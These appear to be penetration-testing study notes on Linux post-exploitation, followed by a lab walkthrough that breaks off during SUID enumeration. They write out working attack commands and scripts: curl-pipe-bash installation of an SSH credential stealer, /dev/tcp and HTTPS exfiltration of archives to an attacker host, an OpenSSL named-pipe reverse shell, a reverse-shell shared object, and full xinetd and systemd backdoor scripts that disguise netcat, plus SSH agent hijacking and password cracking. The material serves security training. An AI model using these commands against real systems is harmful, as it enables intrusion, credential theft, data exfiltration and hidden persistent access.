# Linux Exploitation

## Post Exploitation

### Post Exploitation Introduction - Study Guide

In this phase we:
- Perform additional *information gathering* and *enumeration* of any systems from a local prospective.
- Elevate our privileges (*privilege escalation*).
- Maintain a foothold (*maintaining access/persistence*).
- Pivot to other systems (*lateral movement*).
- Exfiltrate data (*data exfiltration*).

Gather information about system, users, permissions, installed applications, configurations.

We must ensure that the security controls the customers have in place can detect the attacker's existence on the system, changes made to systems, follow the actions of an attacker across a network.

"Live off the land" whenever possible.

### Privilege Escalation - Study Guide

(015/162) In order to utilize a tool once on a system, we first need to download it onto the target.
We can use `wget` if it is installed, but if it is not or we have a restricted Internet connectivity, we can use `netcat` to transfer a file from the attacker system to the target one:
- Attacker system: `nc -w 3 <TargetIP> <Port> < <FilePath>`, if the connection is not established within this interval, netcat terminates.
- Target system: `nc -l -p <Port> > <FilePath>`.
Note that this way to transfer files is not stealthy at all, indeed this may be detected by IDSs or other detection mechanisms.

(031/162) *SUID binaries*.
SUID stands for "Set User ID" and it is a special permission in Linux that allows a user to execute a file with the permissions of the file's owner rather than the permissions of the user who is executing the file.
In other words, if a regular user executes a file with the SUID bit set and owned by the root user, the program will run with root privileges, allowing the user to perform actions that are normally restricted to the root user.

*Dynamic linking* of libraries is a common practice in Linux-based systems where programs dynamically load libraries at runtime to extend their functionalities. When a program is executed, the dynamic linker (`ld.so` or `ld-linux.so`) is responsible for locating and loading these libraries.

One feature of the dynamic linker is the `$ORIGIN` expansion, which allows a program to specify the location of dynamic libraries relative to its own location. For example, if a program resides in `/path/to/program`, the dynamic linker can interpret `$ORIGIN` as `/path/to` during the library loading process.

However, if a program with the SUID privilege is configured to control the `$ORIGIN` library search path, it could potentially lead to privilege escalation. An attacker could exploit this by manipulating the library search path to load a malicious library from a location controlled by the attacker, thereby gaining elevated privileges when the SUID program is executed. 

(048/162) *SUDO privileged access*.
Sudo misconfigurations are another important finding as it relates to privilege escalation.
Sudo is used to provide privileged access to users on a temporary basis, allowing users to run commands
as another user (usually root), and when that elevated access is required, a user can simply run `sudo
<Command>`.

In order for a user to be able to utilize sudo, a change is required in the `/etc/sudoers` configuration file. We can see the sudoers status with `sudo -l`.

There are many examples of binaries on Linux that allow the user to execute shell commands through the `!sh` shell escape, such as: `less`, `more`, `vi`/`vim`, `nmap`, `ftp`, `gdb`, `python`, `perl`, `lua`.

Furthermore, there are also vulnerabilities about the SUID binaries, the SUDO misconfigurations and the *Docker* tool (https://github.com/pyperanger/dockerevil).

(067/162) *Restricted shells* are often used in hardened environments where users require access to servers, but the administrators would like to limit the commands that users on the system can execute.

A *chroot jail* is a way to isolate users and users processes from the rest of the operating system. All programs defined for a chroot jail are run in their own directory structure, with their own shared libraries and environment settings. 
*rbash* is an implementation of restricted shell, that can be defined for a user once logged on to a machine and can be used in conjunction with a chroot jail.

You can usually tell you are in a restricted shell when you start seeing `restricted` errors when you attempt to execute usual commands (e.g. `cd`), or when trying to redirect the output of a command to a file (e.g. `id > /root/Desktop/id.txt`).
`ENV`: to better understand how your environment is configured (`$PATH` environment variable) and what your current shell is (`$SHELL` environment variable).

To break out this restricted shells there are several methods. Sometimes all it takes is some creativity, digging a little bit deeper.

We can use the [*GTFOBins*](https://gtfobins.github.io/) with their shell escape techniques.

If we have SSH credentials to a system for a user that is configured with a restricted shell, we can try and break out
the shell remotely from another system by trying to execute a shell with SSH before the restricted shell is
initialized on the target: `ssh <RestrictedUser>@<TargetIP> -t "/bin/sh"`.

(081/162) *Cracking the shadow*: cracking the password hashes in the `/etc/shadow` file.

In the current versions of Linux, the hashes are stored as SHA-512 (recognizable by the `$6$` at the beginning). Older versions may be using SHA-256 or MD5 (identifiable by `$5$` and `$1$` respectively).

If the password is weak, we can likely crack it regardless to the hashing algorithm.

We can use the *Unshadow* tool in conjunction with *John the Ripper* to crack the hashes.
Unshadow takes both `/etc/passwd` and `/etc/shadow` files and combine them into a format compatible with John the Ripper: `unshadow passwd shadow > shadow.john`.
`john shadow.john --wordlist=<CustomWordlistPath>`: to attempt to crack the password with a choosen wordlist.

Note that we want to crack the hashes offline for many reasons.

(097/162) *MimiPenguin* is a tool to try to extract the passwords directly from the machines memory.
It works similarly to *mimikatz* for Windows, and attempts to dump cleartext credentials from applications like: GDM, Gnome keyring, OpenSSH, Apache2, VSFTPd.
There are two different scripts available, a shell script and a python script, both with their pros and cons.

(101/162) *Pilfering credentials from swap memory*.
We can also dump sensitive information from the swap file.
The partition or file defined as the swap file can be found with: `swapon -s` or `cat /proc/swaps`.
Then we can try to extract the strings we are looking for with: `strings <SwapPartition> | grep "password"`.

There is a tool named [*swap_digger*](https://github.com/sevagas/swap_digger) to automate the process.

(105/162) *Code execution via shared object library loading*.
Similar to Microsoft Windows Dynamic-Link Library (DLL), Shared Object libraries are essentially their equivalent on Linux systems, providing applications with functions that are called from outside of an application by referencing `.so` files at an application runtime. These files can either be linked to the application at runtime or loaded/unloaded and
linked during the application execution.

When a Linux application is executed, one of the first things that happens under-the-hood, if it
uses Shared Objects, is that it will search for those Shared Objects in the following search order:
1. Any directories specified by `-rpath-link` options (`RPATH`).
2. Any directories specified by `-rpath` options (`RPATH`).
3. If the `-rpath` and `-rpath-link` options are not used, it will then search the contents of the environment variables `LD_RUN_PATH` and `LD_LIBRARY_PATH`.
4. Directories defined in the `DT_RUNPATH` environment variable first, if that doesn't exist, then the `DT_RPATH`.
5. Then, the default lib directories, normally `/lib` and `/usr/lib`.
6. Finally, any directories defined in the `/etc/ld.so.conf` file.

To determine that the shared objects are being loaded by an executable: `ldd /path/to/program`.
To determine if the application was compiled with `RPATH` or `RUNPATH` options: `objdump -x /path/to/program | grep "RPATH"`, `objdump -x /path/to/program | grep "RUNPATH"`.

We can drop a malicious (`.so` file) payload in the directories defined by either of those options.

Generate a backdoored Shared Object.
`msfvenom -p linux/x64/shell_reverse_tcp -a x64 --platform linux LHOST=<AttackerIP> LPORT=<AttackerPort> -f elf-so -o /root/Desktop/reverse_tcp64.so`.
Then we need just to transfer the malicious `.so` file to the target machine, and rename it with the loaded shared object name, and place it in the directory pointed by `RPATH` or `RUNPATH`.

An important point to note is that in order to us to elevate our privileges, it is required that the shared object is executed by a user with higher privileges, or scheduled as part of a cron job that runs as root, for example.

(123/162) *Kernel exploits*.
These are the most prolific methods for elevating privileges on Linux machines with outdated kernels.
There are many different categories for kernel exploits:
- Buffer overflows.
- Memory corruption.
- Denial-Of-Service.
- Race conditions.
They most of the time allow for arbitrary code execution.
For our purposes, Linux kernel exploits usually are pre-compiled ELF files, C source code, or available via exploit frameworks such as Metasploit.
Please, always take precaution when compiling and executing exploit code. Try to understand what the code does behind-the-scenes.

For finding the right kernel exploit, we can use a tool named *linux-exploit-suggester*: `/usr/share/linux-exploit-suggester/linux-exploit-suggester.sh -k <TargetKernelVersion>`. It can be executed either locally on the attacker system or directly on the target one.

Keep in mind that not all exploits will be "click-and-shoot". Many of them require parameters and configurations.

For the *exploit compiling*, we can use `gcc <CExploit> -o <CompiledExploit>`, `chmod +x <CompiledExploit>`. Sometimes more complex compile options are required.

Note that Metasploit also contains plenty of kernel exploit modules.

In additions, there is a relatively new exploit framework designed for Linux and Mac targets, known as *Kernelpop*.

(147/162) *Unix socket exploitation*.
A Unix socket is another Unix component you can leverage to escalate the user privileges.
The easiest to follow example on how to leverage an insufficiently secured Unix socket is Docker.
By design, the `docker` daemon binds to a Unix socket instead of a TCP port.
By default, the `docker` daemon always runs as the root user, and the Unix socket is owned by the root user.

Suppose you landed on a machine and that the current user is an unprivileged user, but has access to the `docker` command (he is part of the docker group). And suppose that the docker Unix socket is not protected by implementing the appropriate permissions.

Let's see how we could escalate our privileges in that machine, and specifically try to access to the `/etc/shadow` file content.

`id`:
```
uid-1000(nonroot) gid=1001 (non root) groups=1001 (non root),999 (docker)
```
`cat /etc/shadow`:
```
cat: /etc/shadow: Permission denied
```

`docker run -v /etc/shadow: /docker/hashedpasswords -d postgres`:
```
5888fc048d80a6658e951f755e24eb83ec8688dcd78ec418b419f81756e20665
```
`docker exec -ti 5888fc048d80a6658e951f755e24eb83ec8688dcd78ec418b419f81756e20665 bash`: to connect to the docker Unix socket and escalate our privileges.

`cat /docker/hashedpasswords > /docker/shadow.txt`, `chmod 777 /docker/shadow.txt`, `cat /docker/shadow.txt`: to access the `/etc/shadow` file content.

### Lateral Movement - Study Guide

(12/40) *SSH Hijacking*.
As a pre-requisite for this method, we need that an SSH connection is established via pulic key authentication.

An *SSH agent* is a program that manages SSH keys for passwordless authentication during SSH connections. When you connect to a remote server using SSH and have configured authentication via public/private key pairs, the SSH agent securely stores your private key and uses it to authenticate you automatically when requested by the remote server, eliminating the need to manually enter the password each time you connect.

An *Unix domain socket* is a type of socket used for interprocess communication (IPC) within a single Unix-like system. Unlike network sockets, which allow communication between processes on different machines over a network, Unix domain sockets enable communication between processes on a single machine through the file system.

The *sshd* daemon is the service responsible for managing SSH connections in a Unix-like system. It accepts incoming connections, authenticates users, and manages SSH sessions.

If we are root on the compromised system, we can compromise the SSH agent, and retrieve the authentication keys and hijack the connection.

The reason this is possible is that the SSH agent creates a Unix domain socket, and then listens for connections from the `sshd` daemon to this socket.
The protection of the socket relies on simple unix permissions, which ultimately means that any authentication keys that are used with that socket can be retrieved by any user who can connect to the socket itself (i.e. root).

`ps aux | grep sshd`: to get the `sshd` PID.
`grep SSH_AUTH_SOCK /proc/<SSHPID>/environ`: to determine the `SSH_AUTH_SOCK` environment variable used for the `sshd` PID. This environment variable contains the path of the SSH authentication socket used for connections.
`SSH_AUTH_SOCK=<FoundValue> ssh-add -l`: to hijack the connection. This command manually sets the `SSH_AUTH_SOCK` environment variable to the found value and then executes `ssh-add -l` which lists the SSH keys currently managed by the SSH agent.
`ssh <VictimUser>@<TargetIP>`: to create a new SSH connection impersonating the victim.

(18/40) *Stealing SSH credentials*.
Suppose we compromised a machine with root permissions.
Now, we want to collect as many SSH credentials as possible through a malicious PAM module using the [*sshLooter* tool](https://github.com/mthbernardes/sshLooter).

A *PAM module* (Pluggable Authentication Module) is a software component used in Unix-like systems for managing user authentication. These modules provide a standardized interface that allows customization and configuration of the authentication process, enabling system administrators to implement specific security policies and integrate new forms of authentication without directly modifying application source code.

To do so, we need as pre-requisite a web server that is under our control.
- Attacker system.
`git clone https://github.com/mthbernardes/sshLooter`, `cd sshLooter`.
`python -m SimpleHTTPServer`: the deault port used is 8000.
- Target system.
`curl http://<AttackerIP>:8000/install.sh | bash`.

In this way, every SSH connection attempt, will be forwarded to the server under our control, accompanied by the credentials used.

(22/40) *Samba secrets to domain admin*.
Assume we have a Samba server having a trust relationship with an Active Directory infrastucture. This means that the Samba server is configured to allow users to access shared resources using their Active Directory domain credentials. In addition, the Samba server is authorized to access resources within that Active Directory (AD).
This type of configuration is common in environments where both Windows-based and Linux-based systems coexist.

*Active Directory* (AD) is a centralized directory service developed by Microsoft, for managing users, groups, and network resources within an organization. It provides authentication, authorization, and resource management capabilities, allowing network administrators to control access to user accounts and network resources. It is widely used in enterprise organizations.

When a new Samba user is created, its information is stored in the `/var/lib/samba/private/secrets.tdb` file. If we are root we can access to this information, including NTLM hashes, using: `tdbdump /var/lib/samba/private/secrets.tdb`.
Once obtained the NTLM hashes, we can pass-the-hash to Active Directory using the [`pth-smbclient` tool](https://github.com/byt3bl33d3r/pth-toolkit).

(28/40) [*VPNPivot*](https://github.com/0x36/VPNPivot) is a tool that creates a VPN tunnel between the attacker and the compromised Linux machine, and allows pivoting to other hosts internally within an organization that may be behind NAT and/or firewalls.

(31/40) *Dumping stored Firefox credentials*.
Firefox creates user profiles stored in `~/.mozilla/firefox`. The saved browser passwords are stored there, in a file called `logins.json` and can be dumped with the [`firefox_decrypt.py`](https://raw.githubusercontent.com/unode/firefox_decrypt/main/firefox_decrypt.py) script that will work only if the master password has not been set.

### Data Exfiltration - Study Guide

(04/17) Data Exfiltration.
The goal is to move the data we have acquired securely, outside of the organization infrastructure to our attacker-controlled systems.
This is typically done to test security controls a customer has put in place that would detect things like personally information leaving the infrastructure perimeter or moving across the wire.
Make sure not to transfer anything in cleartext over-the-wire.

(07/17) Exfil over *TCP socket* with EBCDIC and Base64 encoding.
- Target system.
`tar zcf - /tmp/<DataFolder> | base64 | dd conv=ebcdic > /dev/tcp/<AttackerIP>/<AttackerPort>`: where
	- `tar zcf - /tmp/<DataFolder>`: creates a compressed archive (`.tar.gz`) of the specified folder (`/tmp/<DataFolder>`) and sends the output to stdout (`-`) without saving the archive to disk.
	- `/dev/tcp/<AttackerIP>/<AttackerPort>`: is a special address in Linux that allows opening a TCP connection to a specified IP address and port.
- Attacker system.
	- `nc -nl -p <AttackerPort> -v > datafolder.tmp`: where `> datafolder.tmp` sends the output of the previous command (in this case, the data received by netcat) to the specified file (`datafolder.tmp`).
	- `dd conv=ascii if=datafolder.tmp | base64 -d > datafolder.tar`: decodes the received data and redirects the output to a compressed archive file.
	- `tar xf datafolder.tar`: extract the archive.

(11/17) Exfil over *SSH*.
- Target system.
`tar zcf - /tmp/<DataFolder> | ssh <AttackerUser>@<AttackerIP> -p <AttackerPort> "cd /tmp; tar zxpf -"`: where `ssh <AttackerUser>@<AttackerIP> -p <AttackerPort> "cd /tmp; tar zxpf -"`: sends the data to the attacker system through an SSH connection and extracts the archive received from the standard input (`-`) in the `/tmp` directory.
- Attacker system: here the data is already extracted, so we can browse to the `/tmp/<DataFolder>` and view the data.

(13/17) Exfil via POST request over *HTTPS*.
Here, as pre-requisites, we need a PHP-based webserver (configured to execute PHP scripts) that is under our control, and an SSL certificate installed in it.
- Target system.
`curl --data "$(tar zcf - /tmp/<DataFolder> | base64)" https://<AttackerIP>/<PHPScript>`: where
	- specifies the data to send in the POST request.
	- specifies the URL of the web server and the PHP script that will receive the POST request with the data. The `https` option indicates that the request will be sent over a secure channel.
- Attacker system.
	- here we have the content of the `<PHPScript>`: `<?php file_put_contents('/tmp/<DataFolder>', file_get_contents('php://input')); ?>`: where
		- the function `file_get_contents('php://input')` reads the data sent via the HTTP POST request. The string `'php://input'` in PHP represents the body of the incoming HTTP request.
		- the function `file_put_contents(...)` writes the data read from the POST request into the specified file (`/tmp/<DataFolder>`).
	- `cat /tmp/<DataFolder> | base64 -d > datafolder.tar`: decodes the received data and redirects the output to a compressed archive file.
	- `tar xf datafolder.tar`: extract the archive.

We can change the default used ports for extra stealthiness.

### Maintaining Access - Study Guide

(06/40) *Reverse shell*.
Common reverse shells are easy to detect since they have been heavily used and tested.

(09/40) *OpenSSL reverse shell*.
One specific method involves using an OpenSSL connection and the `mkfifo` tool that exploits the Unix named pipes.

A *named pipe*, also known as a FIFO (First In, First Out), is a special type of file in Unix-like operating systems that provides a mechanism for inter-process communication. Unlike regular pipes, which are anonymous and exist only as long as the processes using them are running, named pipes have a persistent presence in the file system and can be accessed by multiple processes simultaneously. Named pipes appear as regular files in the file system, allowing processes to read from them as if they were reading from a file and write to them as if they were writing to a file. This enables data to be passed between processes efficiently and asynchronously, facilitating communication between different parts of a system or between different applications.

(12/40) Example to understand how a named pipe works:
`mkfifo a_pipe`: to create a pipe file.
`gzip -9 -c < a_pipe > out.gz &`: to start a gzip process in the background (-9 for maximum compression) which reads data from the named pipe `a_pipe` and writes compressed output to `out.gz`.
`ls`:
```
a_pipe
```
`cat /etc/passwd > a_pipe`: to write the contents of the `/etc/passwd` file into the named pipe `a_pipe`. This triggers the gzip process to compress the input and write it into `out.gz`.
`ls`:
```
a_pipe	out.gz
```
`gunzip out.gz`: to decompress the file `out.gz`, restoring its original content.
`ls`:
```
a_pipe	out
```
In the `out` file we have the `/etc/passwd` content.

(14/40) `openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes`: to generate an OpenSSL certificate key pair. It will create `key.pem` and `cert.pem`.
`openssl s_server -quiet -key key.pem -cert cert.pem -port 443`: to start up an OpenSSL listener with our certificate and associated key on port 443.
To start up a reverse shell to the attacker machine (over SSL):
```
mkfifo /tmp/x; /bin/sh -i < /tmp/x 2>&1 \
	| openssl s_client -quiet -connect <AttackerIP>:443 > /tmp/x; rm /tmp/x
```

(18/40) *ICMP reverse shell*.
Another reverse shell technique uses the `icmpsh` tool that initiates a reverse shell to an attacker system using ICMP packets.

(20/40) *Stageless payloads*.
To mitigate the instability issues with Meterpreter payloads (Meterpreter session died), we can use stageless payloads. They include the payload within the binary, rather than being pushed to the target system via the handler once a connection is established.
For the name convention in Metasploit, we have that `windows/meterpreter/reverse_tcp` is staged and `windows/meterpreter_reverse_tcp` is stageless.

(24/40) *Custom services*.
Persistence methods using already built-in mechanisms of Linux operating system.

(25/40) *Xinetd UDP portknock backdoor*.
We can utilize the `xinetd` daemon that listens (for example on an UDP port) for incoming requests, and then when a specific request arrive (a single UDP packet), we can execute a command of our choosing (a netcat reverse shell).
It is called portknock backdoor because once we knock it gives us an immediate reverse shell backdoor.
Since `xinetd` is built-in we do not need any third-party software, and also we have reboot persistence.
When executed, the Bash script `xinetd_server.sh` creates a custom xinetd service listening on an UDP (e.g. 65534) port. Furthermore, it obscures the `nc` binary copying it into a different location.
`nc -nl -p 4444`: to start up a netcat listener on the attacker machine.
`hping3 -2 -c 1 <TargetIP> -p 65534`: to send a single UDP packet, triggering the reverse shell connection.
`./xinetd_server.sh`: to execute the script and start the xinetd service.
`cat xinetd_server.sh`:
```
#!/bin/bash

cp /bin/nc /bin/service-udp

echo "service service-udp" > /etc/xinetd.d/service-udp
echo "{" >> /etc/xinetd.d/service-udp
echo "			server = /bin/service-udp" >> /etc/xinetd.d/service-udp
echo "			server_args = <AttackerIP> <AttackerPort> -e /bin/bash" >> /etc/xinetd.d/service-udp
echo "			protocol = udp" >> /etc/xinetd.d/service-udp
echo "			user = root" >> /etc/xinetd.d/service-udp
echo "			socket_type = dgram" >> /etc/xinetd.d/service-udp
echo "			wait = yes" >> /etc/xinetd.d/service-udp
echo "			flags = IPv4" >> /etc/xinetd.d/service-udp
echo "}" >> /etc/xinetd.d/service-udp

echo "service-udp	65534/udp	# service-udp" >> /etc/services

/etc/init.d/xinetd stop
/etc/init.d/xinetd start
```

(32/40) *Systemd Netcat bind shell*.
Also `systemd` is a built-in and assures persistence through reboots.
The process is similar to the xinetd backdoor, but instead of a reverse shell, this one creates a bind shell.
`cp /bin/nc /lib/systemd/systemd-service`: to obscure the `nc` binary.
To create a new systemd service: `nano /lib/systemd/system/systemd.service`:
```
[Unit]
Description = Systemd Service
After = network.target
[Service]
ExecStart = /lib/systemd/systemd-service -nl -p 56825 -v -e /bin/sh
[Install]
WantedBy = multi-user.target
```
It creates a bind shell on 56825 TCP port.
`systemctl enable systemd.service`, `systemctl start systemd.service`: to start the service.
`netstat -auntp | grep 56825 `: to check that the custom service is listening.

### Post Exploitation and Lateral Movement - Video

1. Kernel vulnerability exploitation.

`uname -a`: to display the kernel version.
`dpkg -l | grep "udev"`: to see the `udev` version.
We choose to kernel exploit for `CVE-2009-1185`: "Linux Kernel 2.6 (Gentoo / Ubuntu 8.10/9.04) UDEV < 1.4.1 - Local Privilege Escalation (2)".

First, we need to understand how the exploit code works: it will execute as root whatever we put in the `/tmp/run` directory. For example: `echo -e "#!/bin/bash\n/bin/cat /etc/shadow > /tmp/shadow" > /tmp/run`.
As option, we need to supply the udev link socket PID we can obtain with: `cat /proc/net/netlink`.
It is usually udev PID minus 1, we can confirm this by: `ps aux | grep "udev"`.

`python -m SimpleHTTPServer 80`, `wget http://<AttackerIP>/8572.c`: to download (from the attacker machine) the exploit code to the target system.
`gcc --version`, `gcc 8572.c -o udev_exploit`, `chmod +x udev_exploit`, `./udev_exploit 2767`: to exploit the vulnerability and execute the payload contained in `/tmp/run`.

`ls /tmp`, `cat /tmp/shadow`: to read the captured `/etc/passwd` file content.

2. [*3snake*](https://github.com/blendin/3snake) tool, to obtain user credentials from sudo and SSH processes directly from memory, once we have root access to a machine.

Once a new `sshd` or `sudo` process is detected, it uses the `ptrace` Unix system call to monitor these processes for read/write calls, ultimately extracting strings related to passwords from the process memory.

`wget https://github.com/blendin/3snake/archive/master.zip`, `unzip master.zip`, `cd 3snake-master`, `make`: to download and compile the 3snake tool to the target machine.
`./3snake -h`, `./3snake`: to run the tool and watch in real time for captured credentials.

3. Bettercap usage to capture credentials for HTTP POST requests and FTP, using a MITM attack.
Bettercap uses ARP spoofing to put in place a MITM attack.

We will use Bettercap built-in POST and FTP parsers modules: `cd /root/Desktop/tools/bettercap`, `cp /usr/lib/ruby/vendor_ruby/bettercap/sniffer/parsers/post.rb .`, `cp /usr/lib/ruby/vendor_ruby/bettercap/sniffer/parsers/ftp.rb .`.
`bettercap -X -I eth0 -T <TargetIP1>,<TargetIP2> -P post,ftp`: where `-X` is for the headless execution (without GUI), the tool will automatically determine the LAN gateway, and will capture specifically HTTP POST and FTP traffic between our target hosts.
Remember that as target we can define just a single target, more of them or even a specific IP address range.

Now, all it takes is waiting until your target either makes a POST request or FTP login to another system.

### Linux Exploitation: Lab 3 - Remote Exploitation and Post Exploitation - Lab

You will learn to find and exploit a vulnerable web application in this lab. It will also cover post-exploitation techniques to extract sensitive information and pivot!

In this lab environment, the user will access a Kali GUI instance. A vulnerable application can be accessed using the tools installed on Kali at `http://demo.ine.local`.

Objective: Exploit both the target and find all flags!

The best tools for this lab are:
- Metasploit Framework
- Nmap
- Bash Shell

---

**Step 1**.

`ping demo.ine.local -c 3`:
```
PING demo.ine.local (192.45.82.3) 56(84) bytes of data.
64 bytes from target-1 (192.45.82.3): icmp_seq=1 ttl=64 time=0.094 ms
64 bytes from target-1 (192.45.82.3): icmp_seq=2 ttl=64 time=0.103 ms
64 bytes from target-1 (192.45.82.3): icmp_seq=3 ttl=64 time=0.044 ms

--- demo.ine.local ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2042ms ←
rtt min/avg/max/mdev = 0.044/0.080/0.103/0.025 ms
```

`nmap -sT -sU demo.ine.local`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-28 20:19 IST
Nmap scan report for demo.ine.local (192.45.82.3)
Host is up (0.00013s latency).
rDNS record for 192.45.82.3: target-1
Not shown: 1000 closed udp ports (port-unreach), 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
25/tcp open  smtp
80/tcp open  http
MAC Address: 02:42:C0:2D:52:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 998.05 seconds
```

`nmap -sT -sV demo.ine.local -p25,80`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-28 20:48 IST
Nmap scan report for demo.ine.local (192.45.82.3)
Host is up (0.000042s latency).
rDNS record for 192.45.82.3: target-1

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Exim smtpd 4.89 ←
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu)) ←
MAC Address: 02:42:C0:2D:52:03 (Unknown)
Service Info: Host: demo.ine.local

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.52 seconds
```

**Step 2**.

`nmap --script vuln demo.ine.local -p25,80`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-28 20:51 IST
Nmap scan report for demo.ine.local (192.45.82.3)
Host is up (0.000035s latency).
rDNS record for 192.45.82.3: target-1

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-vuln-cve2010-4344: 
|   Exim version: 4.89
|   Exim heap overflow vulnerability (CVE-2010-4344):
|     Exim (CVE-2010-4344): NOT VULNERABLE
|   Exim privileges escalation vulnerability (CVE-2010-4345):
|     Exim (CVE-2010-4345): NOT VULNERABLE
|_  To confirm and exploit the vulnerabilities, run with --script-args='smtp-vuln-cve2010-4344.exploit'
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|_  /README.txt: Interesting, a readme. ←
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
MAC Address: 02:42:C0:2D:52:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 321.67 seconds
```

`curl -I demo.ine.local | grep -i "x-powered-by"`:
```
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
X-Powered-By: PHP/5.5.9-1ubuntu4.29 ←
```

`dirsearch -u demo.ine.local -e cgi -r`:
```

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: cgi | HTTP method: GET | Threads: 30 | Wordlist size: 9001

Output File: /root/.dirsearch/reports/demo.ine.local_24-02-28_20-42-04.txt

Error Log: /root/.dirsearch/logs/errors-24-02-28_20-42-04.log

Target: http://demo.ine.local/

[20:42:04] Starting: 
[20:42:06] 403 -  292B  - /.ht_wsr.txt                                     
[20:42:06] 403 -  295B  - /.htaccess.bak1
[20:42:06] 403 -  296B  - /.htaccess_extra
[20:42:06] 403 -  295B  - /.htaccess.orig
[20:42:06] 403 -  295B  - /.htaccess.save
[20:42:06] 403 -  295B  - /.htaccess_orig
[20:42:06] 403 -  292B  - /.httr-oauth
[20:42:06] 403 -  297B  - /.htaccess.sample
[20:42:06] 403 -  293B  - /.htaccessOLD
[20:42:06] 403 -  294B  - /.htaccessOLD2
[20:42:06] 403 -  293B  - /.htaccessBAK
[20:42:06] 403 -  293B  - /.htaccess_sc
[20:42:06] 403 -  285B  - /.htm                                            
[20:42:06] 403 -  286B  - /.html
[20:42:06] 403 -  291B  - /.htpasswds                                      
[20:42:06] 403 -  295B  - /.htpasswd_test                                  
[20:42:07] 403 -  285B  - /.php                                            
[20:42:07] 403 -  286B  - /.php3                                           
[20:42:10] 200 -    2KB - /README.txt ←                                      
[20:42:23] 200 -    1KB - /index.php                                        
[20:42:23] 200 -    1KB - /index.php/login/     (Added to queue)            
[20:42:34] 403 -  294B  - /server-status                                    
[20:42:34] 403 -  295B  - /server-status/     (Added to queue)
[20:42:42] Starting: index.php/login/        

...

Task Completed
```

`firefox demo.ine.local/README.txt &`:
```
// ABOUT EGALLERY //

Egallery is a free script that automatically generates image galleries by reading from a directory of image files.
It is designed as a simple way to share image files with clients and give them the ability to download high resolution copies from your own website.

...

----------------------------------------------------------------------------

// VERSIONS //

1.0 
 - Initial release
1.1 : March 5, 2012
 - Improved security
 - Added image upload feature
 - Added zip download feature
 - Fixed bug caused by visiting index.php url
1.2 : March 8, 2012
 - Altered the style
 - Added option to display image EXIF details
```

**Step 3**.

`ip addr | grep "inet"`:
```
    inet 127.0.0.1/8 scope host lo
    inet 10.1.0.11/16 brd 10.1.255.255 scope global eth0
    inet 192.45.82.2/24 brd 192.45.82.255 scope global eth1 ←
```

`msfconsole -q`, `search egallery`, `use exploit/unix/webapp/egallery_upload_exec`, `set PAYLOAD php/meterpreter/reverse_tcp`, `show options`, `set RHOSTS demo.ine.local`, `set LHOST 192.45.82.2`, `set TARGETURI /`, `exploit -j`.
The `TARGETURI` was set to `/sample` by default. But the application is running on the root path of the webserver. So, we need to change that value to `/`.

`sessions -i 1`, `sysinfo`:
```
Computer    : demo.ine.local
OS          : Linux demo.ine.local 5.4.0-152-generic #169-Ubuntu SMP Tue Jun 6 22:23:09 UTC 2023 x86_64
Meterpreter : php/linux
```

`getuid`:
```
Server username: www-data ←
```

`ls`:
```
Listing: /var/www/html
======================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100777/rwxrwxrwx  2155  fil   2012-03-09 03:07:14 +0530  README.txt
040777/rwxrwxrwx  4096  dir   2022-01-24 13:35:56 +0530  THIS_IS_FLAG5234234324 ←
040777/rwxrwxrwx  4096  dir   2012-03-09 00:42:52 +0530  egallery
100777/rwxrwxrwx  4848  fil   2012-03-09 00:13:42 +0530  index.php
100644/rw-r--r--  1122  fil   2024-02-29 14:14:43 +0530  rVRTdiwsS.php
```

`ls THIS_IS_FLAG5234234324`:
```
Listing: THIS_IS_FLAG5234234324
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100777/rwxrwxrwx  33    fil   2022-01-24 13:35:56 +0530  FLAG1 ←
```

`cat THIS_IS_FLAG5234234324/FLAG1`:
```
e56938b6e91af44bc116b494384b579e ←
```

**Step 4**.

`shell`, `find / -type f -perm -4000 -ls 2> /dev/null`: [✗]
```
105392133   96 -rwsr-xr-x   1 root     root        94792 Nov 23  2016 /bin/mount
105392251   40 -rwsr-xr-x   1 root     root        36936 May 16  2017 /bin/su
105392186   44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /bin/ping6
105392306   68 -rwsr-xr-x   1 root     root        69120 Nov 23  2016 /bin/umount
105392182   44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /bin/ping
105513957   12 -rwsr-xr-x   1 root     root        10240 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
105513837  152 -rwsr-xr-x   1 root     root       155008 May 29  2017 /usr/bin/sudo
105513680   48 -rwsr-xr-x   1 root     root        47032 May 16  2017 /usr/bin/passwd
105513344   44 -rwsr-xr-x   1 root     root        41336 May 16  2017 /usr/bin/chsh
105513341   48 -rwsr-xr-x   1 root     root        46424 May 16  2017 /usr/bin/chfn
